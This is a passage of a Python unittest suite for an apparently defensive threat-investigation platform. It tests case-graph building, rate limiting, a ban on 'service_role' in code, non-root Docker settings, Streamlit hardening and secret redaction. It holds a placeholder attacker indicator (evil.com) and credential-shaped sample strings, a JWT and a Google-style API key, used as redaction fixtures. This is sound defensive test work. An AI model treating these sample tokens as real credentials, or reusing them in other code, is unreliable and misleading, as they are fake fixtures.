            "case_number": "CASE-GRAPH-A",
            "sender": "attacker@evil.com",
            "user_id": "usr-a",
            "indicators": [{"type": "DOMAIN", "value": "evil.com", "severity": "HIGH"}],
        }
        fig = build_case_infrastructure_graph("CASE-GRAPH-A", case_a)
        self.assertIsNotNone(fig)
        self.assertTrue(hasattr(fig, "data"))

    def test_36_operational_rate_limiting_resilience(self):
        """General rate limiter correctly tracks discrete action keys."""
        tracker: Dict[str, List[float]] = {}
        key_1 = f"login-{uuid.uuid4()}"
        key_2 = f"geoip-{uuid.uuid4()}"

        allowed_1, _ = check_sliding_window_rate_limit(tracker, key_1, max_requests=2, window_seconds=10)
        self.assertTrue(allowed_1)
        allowed_2, _ = check_sliding_window_rate_limit(tracker, key_1, max_requests=2, window_seconds=10)
        self.assertTrue(allowed_2)
        allowed_3, _ = check_sliding_window_rate_limit(tracker, key_1, max_requests=2, window_seconds=10)
        self.assertFalse(allowed_3)

        # Independent key must still be allowed
        allowed_other, _ = check_sliding_window_rate_limit(tracker, key_2, max_requests=2, window_seconds=10)
        self.assertTrue(allowed_other)


# =====================================================================
# TEST CLASS 11: PLATFORM & CODEBASE HARDENING
# =====================================================================

class TestPlatformAndCodebaseHardening(unittest.TestCase):
    """Verifies service_role prohibition, container security, and configuration hardening."""

    def test_37_zero_service_role_in_codebase(self):
        """Scans core/, worker/, and app.py to guarantee zero runtime usage of service_role."""
        prohibited = "service_" + "role"
        targets = ["core", "worker", "app.py"]
        violations = []

        for target in targets:
            if os.path.isfile(target):
                files = [target]
            elif os.path.isdir(target):
                files = [os.path.join(dp, f) for dp, dn, fn in os.walk(target) for f in fn if f.endswith(".py")]
            else:
                continue

            for fpath in files:
                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                    if prohibited in content:
                        violations.append(fpath)

        self.assertEqual(
            violations,
            [],
            f"CRITICAL SECURITY VIOLATION: prohibited '{prohibited}' detected in: {violations}"
        )

    def test_38_docker_and_runtime_hardening(self):
        """Verifies Dockerfile runs as unprivileged user and .dockerignore blocks secrets."""
        self.assertTrue(os.path.isfile("Dockerfile"))
        with open("Dockerfile", "r", encoding="utf-8") as f:
            docker_content = f.read()
        self.assertIn("USER sentinel", docker_content, "Container must switch to non-root USER")
        self.assertIn("useradd -u 10001", docker_content, "Container must specify unprivileged UID")

        self.assertTrue(os.path.isfile(".dockerignore"))
        with open(".dockerignore", "r", encoding="utf-8") as f:
            ignore_content = f.read()
        self.assertIn(".env", ignore_content)
        self.assertIn("*.key", ignore_content)
        self.assertIn("*.pem", ignore_content)
        self.assertIn(".git", ignore_content)

    def test_39_streamlit_production_configuration(self):
        """Verifies Streamlit config enables XSRF protection, bounds file sizes, and disables telemetry."""
        config_path = os.path.join(".streamlit", "config.toml")
        self.assertTrue(os.path.isfile(config_path))
        with open(config_path, "r", encoding="utf-8") as f:
            config_content = f.read()
        self.assertIn("enableXsrfProtection = true", config_content)
        self.assertIn("maxUploadSize = 10", config_content)
        self.assertIn("gatherUsageStats = false", config_content)

    def test_40_logging_security_zero_credential_exposure(self):
        """Verifies that secret redaction filter neutralizes tokens before logging."""
        raw_log = "Worker authenticated using token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c and key AIzaSyD1234567890abcdefghijklmnopqrstuv"
        cleaned_log = scan_and_redact_secrets(raw_log)
        self.assertNotIn("AIzaSyD", cleaned_log)
        self.assertNotIn("eyJhbGci", cleaned_log)
        self.assertIn("[REDACTED_SECRET]", cleaned_log)


if __name__ == "__main__":
    unittest.main()
